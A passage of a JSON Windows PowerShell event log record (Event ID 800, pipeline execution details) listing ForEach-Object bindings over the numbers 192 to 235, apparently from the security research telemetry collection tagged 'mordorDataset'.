value=\"192\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"193\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"194\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"195\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"196\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"197\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"198\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"199\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"200\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"201\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"202\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"203\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"204\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"205\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"206\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"207\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"208\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"209\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"210\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"211\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"212\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"213\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"214\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"215\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"216\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"217\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"218\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"219\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"220\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"221\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"222\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"223\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"224\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"225\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"226\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"227\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"228\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"229\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"230\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"231\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"232\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"233\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"234\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"235\"\r\n","Opcode":"Info","SourceName":"PowerShell","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","ThreadID":0,"RecordNumber":3420,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":36028797018963968,"Severity":"INFO","host":"wec.internal.cloudapp.net","EventID":800,"port":53971,"@version":"1","Category":"Pipeline Execution Details","EventReceivedTime":"2020-09-04 03:29:47","Task":8,"EventTime":"2020-09-04 03:29:46","Channel":"Windows PowerShell","@timestamp":"2020-09-04T07:29:47.609Z","SourceModuleType":"im_msvistalog","ExecutionProcessID":0,"tags":["mordorDataset"]}
